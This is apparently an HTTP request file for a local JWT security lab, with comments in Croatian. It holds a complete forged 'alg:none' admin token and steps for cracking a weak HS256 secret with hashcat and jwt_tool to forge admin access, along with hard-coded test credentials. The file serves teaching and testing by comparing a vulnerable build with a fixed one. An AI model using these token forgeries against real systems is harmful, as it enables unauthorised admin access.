### Lab12 – JWT propusti
@host = http://localhost:8000
@token = PASTE_TOKEN

### 1. Prijava (kopiraj JWT iz "token" u @token)
POST {{host}}/api/lab12/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2. /me s valjanim tokenom
GET {{host}}/api/lab12/me
Authorization: Bearer {{token}}

### 3. USER na /admin -> 403
GET {{host}}/api/lab12/admin
Authorization: Bearer {{token}}

### 4. EKSPLOATACIJA (alg:none): krivotvoreni ADMIN token bez potpisa
# Header {"alg":"none","typ":"JWT"} . Payload {"sub":"napadac","role":"ADMIN","iat":0,"exp":9999999999} . (prazan potpis)
# Ranjivo (main): 200. Popravljeno: 401.
GET {{host}}/api/lab12/admin
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJuYXBhZGFjIiwicm9sZSI6IkFETUlOIiwiaWF0IjowLCJleHAiOjk5OTk5OTk5OTl9.

### 5. EKSPLOATACIJA (slaba tajna): token potpisan s "secret123"
# Dobiva se razbijanjem tajne: hashcat -m 16500 token.txt wordlists/top-100.txt, pa jwt_tool.
# Generiraj novi s role=ADMIN i tajnom secret123 te ga zalijepi ovdje.
GET {{host}}/api/lab12/admin
Authorization: Bearer PASTE_FORGED_HS256_TOKEN

### 6. ADMIN prijava pa /admin -> 200 (legitimno)
POST {{host}}/api/lab12/login
Content-Type: application/json

{"username": "admin", "password": "Admin123!"}
